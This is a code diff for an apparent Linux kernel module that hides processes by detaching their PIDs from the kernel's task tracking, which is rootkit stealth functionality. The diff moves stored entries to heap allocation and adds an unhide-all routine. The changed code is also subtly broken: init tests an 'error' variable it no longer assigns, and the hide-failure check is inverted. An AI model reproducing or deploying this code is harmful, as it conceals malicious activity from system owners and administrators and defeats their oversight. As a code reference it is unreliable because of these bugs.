@@ -3,6 +3,7 @@
 #include <linux/rculist.h>
 #include <linux/profile.h>
 #include <linux/kernel.h>
+#include <linux/slab.h>
 
 #include "common.h"
 #include "processHider.h"
@@ -18,9 +19,10 @@
 static HiddenProcessCollection collection = NULL;
 
 // Function Prototypes
-static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber);
+static RestorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber);
 static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task);
-static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask taskToRestore);
+static void restoreTaskGivenRcuLockIsHeldAndFreeEntry(RestorableHiddenTask entry);
+static void unhideAllHiddenTasksGivenLockIsHeld(void);
 //
 
 
@@ -33,22 +35,20 @@ struct notifier_block notificationOnProcessExit = {
 //TODO: move this higher in the file
 int processHider_init(void) {
 	// this will fail if profiling is disabled
-	int error = profile_event_register(PROFILE_TASK_EXIT, &notificationOnProcessExit);
-	if (error != 0) { //todo : extract function..
-		return error;
-	}
-
 	collection = createHiddenProcessCollection();
 	if (collection == NULL) {
 		return -1;
 	}
 
+	profile_event_register(PROFILE_TASK_EXIT, &notificationOnProcessExit);
+	if (error != 0) { //todo : extract function..
+		destoryHiddenProcessCollection(collection);
+		return error;
+	}
+
 	return 0;
 }
 
-static void unhideAllHiddenTasksGivenLockIsHeld(void) {
-	//TODO: write this
-}
 
 void processHider_exit(void) {
 	// perhaps kill hidden processes / require that the tasks are dead first..
@@ -62,13 +62,13 @@ void processHider_exit(void) {
 
 	unhideAllHiddenTasksGivenLockIsHeld();
 
+	destoryHiddenProcessCollection(collection);
+	collection = NULL;
+
 	rcu_read_unlock();
 }
 
-
-
 //returns error code...
-//PRESENTLY ONLY SUPPORTS HIDING ONE PROCESS
 int hideProcess(int pidNumber) {
 	int result;
 	
@@ -76,11 +76,11 @@ int hideProcess(int pidNumber) {
 		printError("Failed to hide process. Too may processes are hidden.\n");
 		result = -1;
 	} else {
-		struct restorableHiddenTask hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);
+		RestorableHiddenTask hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);
 
 		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 
-		if (hiddenTask.task == NULL) {
+		if (hiddenTask != NULL) {
 			result = -1;
 			printError("failed to hide task\n");
 		} else {
@@ -97,41 +97,43 @@ int showProcess(int pid) {
 	rcu_read_lock();
 
 	if (isPidInCollection(collection, pid)) {
-		struct restorableHiddenTask restorableHiddenTask = removePidFromCollection(collection, pid);
-		restoreTaskGivenRcuLockIsHeld(restorableHiddenTask);
+		RestorableHiddenTask entry = removePidFromCollection(collection, pid);
+		restoreTaskGivenRcuLockIsHeldAndFreeEntry(entry);
 	}
 
 	rcu_read_unlock();
 	return 0;
 }
 
-static struct restorableHiddenTask createRestorableTask(struct task_struct *task, struct pid *originalPid, int pidNumber) {
-	struct restorableHiddenTask result = {
-		.task = task,
-		.originalPid = originalPid,
-		.pidNumber = pidNumber,
-	};
+static RestorableHiddenTask createRestorableTask(struct task_struct *task, struct pid *originalPid, int pidNumber) {
+	RestorableHiddenTask result = kmalloc(sizeof(struct restorableHiddenTask),__GFP_NOWARN);
+
+	if (result != NULL) {
+		result->task = task;
+		result->originalPid = originalPid;
+		result->pidNumber = pidNumber;
+	}
+
 	return result;
 }
 
-static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber) {
+static RestorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber) {
 	struct task_struct *task;
 	struct pid *originalPid;
 	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
 
 	if (pid == NULL) {
-		return createRestorableTask(NULL, NULL, -1); 	//TODO: improve ability to return failure
+		return NULL;
 	}
-
 
 	task = pid_task(pid, PIDTYPE_PID);
 
-	if (task != NULL) {
-		originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
-	} else {
-		originalPid = NULL;
+	if (task == NULL) {
+		return NULL;
 	}
 
+
+	originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
 	return createRestorableTask(task, originalPid, pidNumber);
 }
 
@@ -139,10 +141,10 @@ static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, 
 	//printInfo("in notification function for exit - task is %p\n", task);
 
 	if (isTaskInCollection(collection, task)) {
-		struct restorableHiddenTask entry = removeTaskFromCollection(collection, task);
+		RestorableHiddenTask entry = removeTaskFromCollection(collection, task);
 		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 
-		restoreTaskGivenRcuLockIsHeld(entry);
+		restoreTaskGivenRcuLockIsHeldAndFreeEntry(entry);
 
 		rcu_read_unlock();
 	}
@@ -150,9 +152,21 @@ static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, 
 	return 0;
 }
 
-static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask taskToRestore) {
+static void restoreTaskGivenRcuLockIsHeldAndFreeEntry(RestorableHiddenTask entry) {
 	printInfo("Unhiding task\n");
-	attach_pid(taskToRestore.task, PIDTYPE_PID, taskToRestore.originalPid);
+	attach_pid(entry->task, PIDTYPE_PID, entry->originalPid);
+	kfree(entry);
 }
 
 
+static void unhideAllHiddenTasksGivenLockIsHeld(void) {
+	RestorableHiddenTask entry = removeAnyHiddenTask(collection);
+	while (entry != NULL) {
+		rcu_read_lock();
+
+		restoreTaskGivenRcuLockIsHeldAndFreeEntry(entry);
+		rcu_read_unlock();
+
+		entry = removeAnyHiddenTask(collection);
+	}
+}
